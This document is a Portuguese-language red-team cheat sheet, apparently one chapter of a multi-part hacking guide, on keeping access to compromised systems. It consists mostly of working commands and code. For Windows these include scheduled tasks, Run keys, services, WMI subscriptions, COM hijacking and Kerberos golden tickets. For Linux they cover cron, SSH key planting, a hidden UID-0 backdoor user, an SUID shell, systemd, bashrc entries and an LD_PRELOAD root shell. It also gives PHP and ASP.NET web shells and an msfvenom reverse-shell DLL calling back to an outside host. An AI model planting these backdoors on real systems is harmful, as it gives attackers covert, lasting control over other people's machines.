# 🔒 Fase 5: Persistência

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Objetivo:** Manter o acesso ao sistema comprometido mesmo após reinícios ou deteção.

> **Nota sobre os exemplos:** persistência significa manter um mecanismo de acesso; não garante acesso após a sua deteção e remoção. Os tickets Kerberos têm validade e dependem das chaves e políticas relevantes. Um serviço Windows requer um executável compatível com a interface de serviços: um ficheiro arbitrário chamado `shell.exe` não o é necessariamente. Valores como `AAAA...your_key...`, `$1$xyz$hash` e `IEX(payload)` são marcadores de exemplo; os blocos preservados não constituem programas completos.

---

## 🖥️ Persistência em Windows

### Tarefas agendadas
```cmd
# Criar uma tarefa agendada (executada como SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Com um utilizador específico
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# No arranque
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# A cada hora
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Listar tarefas
schtasks /query /fo LIST /v

# Eliminar a tarefa
schtasks /delete /tn "TaskName" /f
```

### Chaves Run do registo
```cmd
# HKCU — utilizador atual (não requer administrador)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM — todos os utilizadores (requer administrador)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (executa uma vez e elimina a entrada)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Pasta de arranque automático
```cmd
# Utilizador atual
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Todos os utilizadores (requer administrador)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Serviços
```cmd
# Criar um serviço (requer administrador)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modificar um serviço existente
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### Subscrições de eventos WMI
```powershell
# Criar persistência WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL hijacking / ordem de pesquisa
```cmd
# Procurar oportunidades de DLL hijacking
# Colocar a DLL maliciosa na pasta da aplicação
# Alvos comuns:
# - Ficheiros de programas sem caminhos completos de DLL
# - DLLs em falta

# Criar uma DLL maliciosa
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM hijacking (desvio de objetos COM)
```powershell
# Procurar objetos COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Criar o desvio
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket — acesso persistente como administrador do domínio
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket — acesso persistente ao serviço
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Persistência em Linux

### Tarefas cron
```bash
# Crontab do utilizador
crontab -e
# Adicionar: * * * * * /tmp/shell.sh

# Crontab do sistema
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Pastas cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### Chaves SSH
```bash
# Adicionar a tua chave pública a authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Acesso root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Utilizador para acesso por backdoor
```bash
# Adicionar um utilizador com privilégios root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Ou adicionar diretamente a /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Binário SUID
```bash
# Copiar bash e definir SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Executar como root
/tmp/.hidden -p
```

### Serviço systemd
```bash
# Criar o ficheiro do serviço
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Ativar e iniciar
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Adicionar ao bashrc do utilizador
echo '/tmp/shell &' >> ~/.bashrc

# Adicionar ao profile global
echo '/tmp/shell &' >> /etc/profile

# Adicionar a bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Criar uma biblioteca partilhada maliciosa
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Adicionar a LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell
```bash
# Web shell PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Mais oculta
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Persistência Web

### Localizações de Web shells
```bash
# Localizações comuns de Web shells
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Referência rápida

### Métodos de persistência em Windows

| Método | Localização | Privilégio |
|--------|----------|-----------|
| Run do registo | HKCU/HKLM | Utilizador/administrador |
| Tarefa agendada | Agendador de Tarefas | Utilizador/administrador |
| Pasta de arranque automático | AppData/ProgramData | Utilizador/administrador |
| Serviço | Serviços | Administrador |
| WMI | Subscrição WMI | Administrador |
| Desvio de COM | HKCU CLSID | Utilizador |

### Métodos de persistência em Linux

| Método | Localização | Privilégio |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| Chaves SSH | ~/.ssh/authorized_keys | Utilizador |
| SUID | Binário com +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Utilizador |

---

## 🔗 Guias de referência relacionados

- [PowerShell](../../PowerShell/README.md)
- [Comandos Linux](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Fase anterior:** [← 04 - Movimento lateral](./04-Lateral-Movement.pt.md)

**Fase seguinte:** [06 - Evasão de defesas →](./06-Defense-Evasion.pt.md)
